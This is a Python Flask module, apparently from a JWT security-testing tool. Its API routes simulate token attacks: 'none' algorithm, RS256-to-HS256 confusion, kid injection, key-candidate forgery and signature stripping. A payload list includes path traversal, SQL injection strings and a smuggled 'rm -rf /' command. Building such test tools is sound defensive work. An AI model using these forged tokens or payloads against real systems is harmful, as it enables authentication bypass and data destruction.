from flask import request, jsonify, g
from flask_jwt_extended import jwt_required, get_jwt_identity
from db import db, User, SavedToken
import json
import time

def register_attack_routes(app, limiter):
    """
    Register routes for attack simulation.
    
    Routes include:
    - Algorithm confusion attack
    - Key ID manipulation
    - Token forgery
    - Signature stripping
    - Full attack simulation
    """
    
    @app.route('/api/attacks/algorithm-confusion', methods=['POST'])
    @limiter.limit("15/minute")
    def algorithm_confusion_attack():
        """
        Simulate an algorithm confusion attack (RS256 to HS256)
        """
        if not request.is_json:
            return jsonify({"error": "Missing JSON in request"}), 400
            
        data = request.json or {}
        token = data.get('token', '')
        public_key = data.get('public_key', '')
        
        if not token:
            return jsonify({"error": "Token is required"}), 400
            
        if not public_key:
            return jsonify({"error": "Public key is required"}), 400
            
        # Use JWT utils to attempt the attack
        jwt_utils = g.jwt_utils
        result = jwt_utils.attempt_key_confusion(token, public_key)
        
        # Log the activity
        username = get_jwt_identity() if hasattr(g, 'jwt') else "anonymous"
        g.audit_manager.log_event(
            event_type="attack_algorithm_confusion",
            username=username,
            details=f"Algorithm confusion attack attempted: {'success' if result.get('success') else 'failure'}"
        )
        
        return jsonify(result)
    
    @app.route('/api/attacks/key-injection', methods=['POST'])
    @limiter.limit("15/minute")
    def key_injection_attack():
        """
        Simulate a Key ID (kid) injection attack
        """
        if not request.is_json:
            return jsonify({"error": "Missing JSON in request"}), 400
            
        data = request.json or {}
        token = data.get('token', '')
        kid_value = data.get('kid', '')
        
        if not token:
            return jsonify({"error": "Token is required"}), 400
            
        if not kid_value:
            return jsonify({"error": "Key ID value is required"}), 400
            
        # Decode the token to get its parts
        jwt_utils = g.jwt_utils
        token_parts = jwt_utils.decode_token_parts(token)
        
        if "error" in token_parts:
            return jsonify({"error": token_parts["error"]}), 400
            
        # Modify the header to include the injected kid
        header = token_parts["header"]
        header["kid"] = kid_value
        
        # Create a new token with the modified header
        payload = token_parts["payload"]
        
        # Setting algorithm to "none" as an example - in real scenario would depend on the attack
        modified_token = jwt_utils.create_token(payload, "", "none", header)
        
        # Log the activity
        username = get_jwt_identity() if hasattr(g, 'jwt') else "anonymous"
        g.audit_manager.log_event(
            event_type="attack_key_injection",
            username=username,
            details=f"Key injection attack with kid: {kid_value}"
        )
        
        return jsonify({
            "success": True,
            "original_token": token,
            "modified_token": modified_token,
            "injected_kid": kid_value,
            "details": "The token has been crafted with an injected kid parameter. In vulnerable systems, this can lead to unexpected key lookups or SQL/file path injection."
        })
    
    @app.route('/api/attacks/token-forgery', methods=['POST'])
    @limiter.limit("10/minute")
    def token_forgery_attack():
        """
        Attempt to forge a token by trying different keys
        """
        if not request.is_json:
            return jsonify({"error": "Missing JSON in request"}), 400
            
        data = request.json or {}
        token = data.get('token', '')
        key_candidates = data.get('key_candidates', [])
        
        if not token:
            return jsonify({"error": "Token is required"}), 400
            
        if not key_candidates:
            return jsonify({"error": "At least one key candidate is required"}), 400
            
        # Use JWT utils to attempt the attack
        jwt_utils = g.jwt_utils
        result = jwt_utils.attempt_token_forgery(token, key_candidates)
        
        # Log the activity
        username = get_jwt_identity() if hasattr(g, 'jwt') else "anonymous"
        g.audit_manager.log_event(
            event_type="attack_token_forgery",
            username=username,
            details=f"Token forgery attack attempted with {len(key_candidates)} key candidates: {'success' if result.get('success') else 'failure'}"
        )
        
        return jsonify(result)
    
    @app.route('/api/attacks/signature-stripping', methods=['POST'])
    @limiter.limit("30/minute")
    def signature_stripping_attack():
        """
        Simulate a signature stripping attack by removing the signature part of a JWT
        """
        if not request.is_json:
            return jsonify({"error": "Missing JSON in request"}), 400
            
        data = request.json or {}
        token = data.get('token', '')
        
        if not token:
            return jsonify({"error": "Token is required"}), 400
            
        # Split the token and remove the signature
        parts = token.split('.')
        
        if len(parts) != 3:
            return jsonify({"error": "Invalid token format"}), 400
            
        stripped_token = f"{parts[0]}.{parts[1]}."
        
        # Log the activity
        username = get_jwt_identity() if hasattr(g, 'jwt') else "anonymous"
        g.audit_manager.log_event(
            event_type="attack_signature_stripping",
            username=username,
            details="Signature stripping attack simulated"
        )
        
        return jsonify({
            "success": True,
            "original_token": token,
            "stripped_token": stripped_token,
            "details": "The signature portion of the token has been removed. In vulnerable systems, this may bypass signature verification."
        })
    
    @app.route('/api/attacks/simulation', methods=['POST'])
    @jwt_required()
    @limiter.limit("5/minute")
    def run_attack_simulation():
        """
        Run a comprehensive attack simulation on a token
        """
        if not request.is_json:
            return jsonify({"error": "Missing JSON in request"}), 400
            
        data = request.json or {}
        token = data.get('token', '')
        simulation_options = data.get('options', {})
        
        if not token:
            return jsonify({"error": "Token is required"}), 400
            
        current_user = get_jwt_identity()
        user = User.query.filter_by(username=current_user).first()
        
        if not user:
            return jsonify({"error": "User not found"}), 404
            
        # Start the simulation
        results = {
            "token": token,
            "simulation_id": f"sim_{int(time.time())}",
            "timestamp": time.time(),
            "attacks": []
        }
        
        # Decode the token
        jwt_utils = g.jwt_utils
        token_info = jwt_utils.decode_token_parts(token)
        
        if "error" in token_info:
            return jsonify({"error": token_info["error"]}), 400
            
        results["token_info"] = {
            "header": token_info["header"],
            "claims": token_info["payload"]
        }
        
        # Run the selected attacks
        
        # 1. None algorithm attack
        if simulation_options.get('none_algorithm', True):
            header = token_info["header"].copy()
            header["alg"] = "none"
            payload = token_info["payload"]
            none_token = jwt_utils.create_token(payload, "", "none", header)
            
            results["attacks"].append({
                "name": "None Algorithm Attack",
                "description": "Modifies the algorithm to 'none' to bypass signature verification",
                "severity": "Critical",
                "modified_token": none_token,
                "details": "The token has been modified to use the 'none' algorithm. Some libraries improperly handle this and skip signature verification."
            })
        
        # 2. Algorithm confusion attack
        if simulation_options.get('algorithm_confusion', True):
            # Get a public key from the database or generate one
            key_manager = g.key_manager
            if token_info["header"].get("alg") == "RS256":
                confusion_result = jwt_utils.attempt_key_confusion(token, key_manager.generate_rsa_key_pair()["public_key"])
                
                if confusion_result.get("success"):
                    results["attacks"].append({
                        "name": "Algorithm Confusion Attack",
                        "description": "Changes algorithm from RS256 to HS256, using the public key as the HMAC secret",
                        "severity": "High",
                        "modified_token": confusion_result.get("modified_token"),
                        "details": "The token algorithm has been switched from RS256 to HS256, attempting to use the public key as an HMAC secret."
                    })
                else:
                    results["attacks"].append({
                        "name": "Algorithm Confusion Attack",
                        "description": "Changes algorithm from RS256 to HS256, using the public key as the HMAC secret",
                        "severity": "High",
                        "result": "Attack simulation prepared but no token generated",
                        "details": "The attack requires a valid RSA public key for the target system."
                    })
        
        # 3. Signature stripping
        if simulation_options.get('signature_stripping', True):
            parts = token.split('.')
            if len(parts) == 3:
                stripped_token = f"{parts[0]}.{parts[1]}."
                
                results["attacks"].append({
                    "name": "Signature Stripping Attack",
                    "description": "Removes the signature part of the token",
                    "severity": "High",
                    "modified_token": stripped_token,
                    "details": "The signature has been removed from the token. Some implementations might accept this token if they don't properly validate signatures."
                })
        
        # 4. Kid injection
        if simulation_options.get('kid_injection', True):
            if "kid" in token_info["header"] or simulation_options.get('force_kid_injection', False):
                header = token_info["header"].copy()
                
                # Different kid injection payloads
                kid_payloads = [
                    "../../dev/null",
                    "file:///dev/null",
                    "../../../../../../../dev/null",
                    "1' OR '1'='1",
                    ";SELECT * FROM users--",
                    "kid.txt; rm -rf /;",
                    {"sql": "1'; DROP TABLE users; --"}
                ]
                
                for i, kid in enumerate(kid_payloads[:3]):  # Limit to first 3 for brevity
                    header["kid"] = kid
                    injected_token = jwt_utils.create_token(token_info["payload"], "", header.get("alg", "HS256"), header)
                    
                    results["attacks"].append({
                        "name": f"Key ID Injection Attack {i+1}",
                        "description": f"Injects a malicious value in the kid parameter: {kid}",
                        "severity": "High",
                        "modified_token": injected_token,
                        "details": "The kid header parameter has been injected with a potentially malicious value that could lead to file path traversal or SQL injection in vulnerable implementations."
                    })
        
        # Log the activity
        g.audit_manager.log_event(
            event_type="attack_simulation",
            username=current_user,
            details=f"Attack simulation executed with {len(results['attacks'])} attacks"
        )
        
        # Save the results to the database if requested
        if simulation_options.get('save_results', False):
            simulation_report = {
                "timestamp": time.time(),
                "token": token,
                "results": results,
                "user_id": user.id
            }
            
            # Pseudo-code for saving to database
            # simulation = AttackSimulation(**simulation_report)
            # db.session.add(simulation)
            # db.session.commit()
        
        return jsonify(results) 